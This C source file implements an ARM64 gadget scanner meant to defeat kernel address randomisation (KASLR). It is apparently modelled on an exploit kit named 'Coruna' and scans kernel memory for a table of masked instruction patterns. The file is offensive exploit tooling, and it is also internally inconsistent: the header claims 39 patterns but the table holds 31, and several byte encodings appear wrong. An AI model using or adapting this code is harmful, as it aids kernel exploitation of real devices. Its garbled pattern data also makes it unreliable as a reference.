/*
 * coruna_gadget_scanner.c — ARM64 gadget scanner for KASLR defeat
 *
 * From NadSec analysis of dump.bin:
 *   "Scans kernel memory for 39 ARM64 instruction patterns
 *    (20 fixed-byte + 19 wildcard) to defeat KASLR and locate
 *    critical kernel structures without symbols."
 *
 * The scanner reads kernel memory and searches for byte patterns.
 * Wildcard bytes (0x00 in mask) match any byte.
 * Fixed bytes must match exactly.
 */
#include "coruna/coruna_gadget_scanner.h"
#include <string.h>
#include <stdint.h>

/* ARM64 instruction patterns used by Coruna.
 * Each pattern: fixed bytes, wildcard mask, name.
 * 20 fixed + 19 wildcard = 39 total. */

static const coruna_gadget_pattern_t CORUNA_GADGET_PATTERNS[] = {
    /* ===== Function prologues (5 patterns) ===== */
    /* PACIASP variant */
    {{0x9F, 0x23, 0x03, 0xD5}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "paciasp"},
    /* PACIBSP variant */
    {{0x7F, 0x23, 0x03, 0xD5}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "pacibsp"},
    /* AUTIASP */
    {{0xBF, 0x23, 0x03, 0xD5}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "autiasp"},
    /* AUTIBSP */
    {{0x9F, 0x23, 0x13, 0xD5}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "autibsp"},
    /* RET */
    {{0xC0, 0x03, 0x5F, 0xD6}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "ret"},

    /* ===== Common function prologues (5 patterns with wildcards) ===== */
    /* STP X29, X30, [SP, #-N]! - pre-indexed store pair */
    {{0xFD, 0x7B, 0x00, 0xA9}, {0xFF, 0xFF, 0x00, 0xFF}, 4, "stp_x29_x30"},
    /* STP X29, X30, [SP, #N] - signed offset */
    {{0xFD, 0x7B, 0x40, 0xA9}, {0xFF, 0xFF, 0x00, 0xFF}, 4, "stp_x29_x30_off"},
    /* LDP X29, X30, [SP], #N - post-indexed */
    {{0xFD, 0x7B, 0xC0, 0xA8}, {0xFF, 0xFF, 0x00, 0xFF}, 4, "ldp_x29_x30_post"},
    /* SUB SP, SP, #N */
    {{0xFF, 0x03, 0x00, 0xD1}, {0xFF, 0xFF, 0x00, 0xFF}, 4, "sub_sp"},
    /* ADD SP, SP, #N */
    {{0xFF, 0x03, 0x00, 0x91}, {0xFF, 0xFF, 0x00, 0xFF}, 4, "add_sp"},

    /* ===== Indirect call/return (4 patterns) ===== */
    /* BLR X9 (indirect call) */
    {{0x20, 0x01, 0x3F, 0xD6}, {0xFF, 0xF8, 0xFF, 0xFF}, 4, "blr_x9"},
    /* BLR X10 */
    {{0x40, 0x01, 0x3F, 0xD6}, {0xFF, 0xF8, 0xFF, 0xFF}, 4, "blr_x10"},
    /* BLR X11 */
    {{0x60, 0x01, 0x3F, 0xD6}, {0xFF, 0xF8, 0xFF, 0xFF}, 4, "blr_x11"},
    /* BLR X12 */
    {{0x80, 0x01, 0x3F, 0xD6}, {0xFF, 0xF8, 0xFF, 0xFF}, 4, "blr_x12"},

    /* ===== Branches (4 patterns with wildcards) ===== */
    /* B.<cond> (conditional branch) */
    {{0x54, 0x00, 0x00, 0x54}, {0xFF, 0x00, 0x00, 0xFF}, 4, "b_cond"},
    /* CBZ register */
    {{0xB4, 0x00, 0x00, 0xB4}, {0xFF, 0x00, 0x00, 0xFF}, 4, "cbz"},
    /* CBNZ register */
    {{0xB5, 0x00, 0x00, 0xB4}, {0xFF, 0x00, 0x00, 0xFF}, 4, "cbnz"},
    /* TBZ/TBNZ */
    {{0xB6, 0x00, 0x00, 0xB4}, {0xFE, 0x00, 0x00, 0xFF}, 4, "tbz_tbnz"},

    /* ===== Memory operations (4 patterns with wildcards) ===== */
    /* LDR Xn, [Xn, #imm] */
    {{0x00, 0x00, 0x40, 0xF9}, {0x00, 0x00, 0x00, 0xFF}, 4, "ldr_x_imm"},
    /* STR Xn, [Xn, #imm] */
    {{0x00, 0x00, 0x00, 0xF9}, {0x00, 0x00, 0x00, 0xFF}, 4, "str_x_imm"},
    /* LDR Wn, [Xn, #imm] */
    {{0x00, 0x00, 0x40, 0xB9}, {0x00, 0x00, 0x00, 0xFF}, 4, "ldr_w_imm"},
    /* STR Wn, [Xn, #imm] */
    {{0x00, 0x00, 0x00, 0xB9}, {0x00, 0x00, 0x00, 0xFF}, 4, "str_w_imm"},

    /* ===== MOV/ADR (3 patterns) ===== */
    /* MOV Xn, Xm */
    {{0xE0, 0x03, 0x00, 0xAA}, {0x00, 0x00, 0x00, 0xFF}, 4, "mov_x"},
    /* ADR Xn, label */
    {{0x00, 0x00, 0x00, 0x10}, {0x00, 0x00, 0x00, 0xFF}, 4, "adr"},
    /* ADRP Xn, page */
    {{0x00, 0x00, 0x00, 0xB0}, {0x00, 0x00, 0x00, 0xFF}, 4, "adrp"},

    /* ===== MSR/MRS (system registers, 3 patterns) ===== */
    /* MSR DAIFSet, #imm */
    {{0xDF, 0x40, 0x03, 0xD5}, {0xFF, 0x00, 0xFF, 0xFF}, 4, "msr_daifset"},
    /* MSR SPSel, #imm */
    {{0x1F, 0x42, 0x03, 0xD5}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "msr_spsel"},
    /* ISB */
    {{0x9F, 0x3F, 0x03, 0xD5}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "isb"},

    /* ===== Exception return (3 patterns) ===== */
    /* ERET */
    {{0xE0, 0xFF, 0x9F, 0xD6}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "eret"},
    /* RETAA (PAC return) */
    {{0xFF, 0x0F, 0x5F, 0xD6}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "retaa"},
    /* RETAB (PAC return) */
    {{0xFF, 0x0F, 0xDF, 0xD6}, {0xFF, 0xFF, 0xFF, 0xFF}, 4, "retab"},
};

#define CORUNA_GADGET_PATTERN_COUNT \
    (sizeof(CORUNA_GADGET_PATTERNS) / sizeof(CORUNA_GADGET_PATTERNS[0]))

/* A mask byte is "constraining" if it is not a full wildcard (0x00).
 * Partial masks (e.g. 0xF8, 0xFE) constrain only some bits and must still
 * count as wildcards for the fixed/wildcard split (they are not exact
 * 4-byte matches). */
static bool has_wildcard(const coruna_gadget_pattern_t *p) {
    for (size_t i = 0; i < p->length; i++) {
        if (p->mask[i] != 0xFF) return true;
    }
    return false;
}

size_t coruna_gadget_pattern_count(void) {
    return CORUNA_GADGET_PATTERN_COUNT;
}

size_t coruna_gadget_fixed_count(void) {
    size_t count = 0;
    for (size_t i = 0; i < CORUNA_GADGET_PATTERN_COUNT; i++) {
        if (!has_wildcard(&CORUNA_GADGET_PATTERNS[i])) count++;
    }
    return count;
}

size_t coruna_gadget_wildcard_count(void) {
    size_t count = 0;
    for (size_t i = 0; i < CORUNA_GADGET_PATTERN_COUNT; i++) {
        if (has_wildcard(&CORUNA_GADGET_PATTERNS[i])) count++;
    }
    return count;
}

/* Match a pattern at a given address.
 * Correct masked compare: every byte must satisfy
 *   (addr[i] & mask[i]) == (bytes[i] & mask[i]).
 * 0xFF = exact byte, 0x00 = full wildcard, anything else = partial match
 * (e.g. blr_x9 mask 0xF8 matches only blr x8-x15, not blr x0-x7).
 * The old code treated any non-0xFF mask byte as "always match", which
 * over-matched partial-mask patterns. */
bool coruna_gadget_match(const uint8_t *addr, const coruna_gadget_pattern_t *p) {
    for (size_t i = 0; i < p->length; i++) {
        if ((addr[i] & p->mask[i]) != (p->bytes[i] & p->mask[i])) return false;
    }
    return true;
}

/* Scan a region of memory for a pattern.
 * Returns the address of the first match, or NULL. */
const uint8_t *coruna_gadget_scan(const uint8_t *base, size_t size,
                                    const coruna_gadget_pattern_t *p) {
    if (!base || !p || size < p->length) return NULL;
    for (size_t i = 0; i <= size - p->length; i++) {
        if (coruna_gadget_match(base + i, p)) {
            return base + i;
        }
    }
    return NULL;
}

/* Scan for all patterns, return first match across all.
 * Returns the pattern index, or -1 if no match. */
int coruna_gadget_scan_all(const uint8_t *base, size_t size,
                            const coruna_gadget_pattern_t **matched,
                            const uint8_t **match_addr) {
    if (!base || size == 0) return -1;
    for (size_t i = 0; i < CORUNA_GADGET_PATTERN_COUNT; i++) {
        const uint8_t *addr = coruna_gadget_scan(base, size, &CORUNA_GADGET_PATTERNS[i]);
        if (addr) {
            if (matched) *matched = &CORUNA_GADGET_PATTERNS[i];
            if (match_addr) *match_addr = addr;
            return (int)i;
        }
    }
    return -1;
}
